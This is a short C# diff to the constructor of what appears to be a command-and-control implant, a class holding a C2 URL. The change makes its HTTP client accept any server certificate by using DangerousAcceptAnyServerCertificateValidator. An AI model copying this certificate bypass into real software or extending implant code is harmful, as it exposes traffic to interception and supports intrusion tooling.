@@ -22,7 +22,11 @@ namespace Implant
             this.c2Url = c2Url;
             this.name = name;
             this.cryptoProvider = new CryptoProvider();
-            this.client = new HttpClient();
+            var handler = new HttpClientHandler()
+            {
+                ServerCertificateCustomValidationCallback = HttpClientHandler.DangerousAcceptAnyServerCertificateValidator
+            };
+            this.client = new HttpClient(handler);
             this.client.DefaultRequestHeaders.UserAgent.TryParseAdd(userAgent);
         }
 
